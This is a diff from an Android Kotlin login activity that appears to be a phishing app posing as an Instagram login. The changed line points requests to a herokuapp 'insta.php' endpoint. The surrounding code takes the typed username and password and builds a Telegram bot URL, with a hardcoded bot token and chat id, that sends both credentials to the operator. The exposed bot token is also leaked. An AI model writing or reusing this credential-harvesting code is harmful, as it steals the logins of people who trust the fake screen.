@@ -46,7 +46,7 @@ class Main2Activity : AppCompatActivity() {
         login.setOnClickListener {
             var us = username.text.toString()
             var ps = password.text.toString()
-            var url ="http://apivtcor.ml/index.php?user=$us"
+            var url ="https://omarrealinsta.herokuapp.com/insta.php?user=$us"
             var token = "463316857:AAFICAGzZCYpL-WZ166neP_G1R0oHCbgd3E"
             var id = "314447848"
             var url2 = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=username: ($us) \n password: ($ps)"
